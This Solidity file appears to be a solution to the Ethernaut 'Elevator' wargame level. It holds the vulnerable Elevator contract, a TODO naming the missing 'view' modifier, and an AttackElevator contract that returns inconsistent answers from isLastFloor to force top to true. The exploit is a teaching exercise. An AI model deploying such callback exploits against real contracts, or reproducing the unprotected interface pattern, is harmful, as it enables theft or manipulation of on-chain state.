// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// TODO: solve this security flaw by putting 'view' here in isLastFloor(uint)
interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {

  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract AttackElevator {

    Elevator elevator;

    constructor(address _elevatorAddress) {
        elevator = Elevator(_elevatorAddress);
    }

    function attack() public {
        elevator.goTo(99);
    }

    uint public count = 0;

    function isLastFloor(uint a) external returns (bool) {
        if(count == 0) {
            count += 1;
            return false;
        } else {
            count += 1;
            return true;
        }
    }
}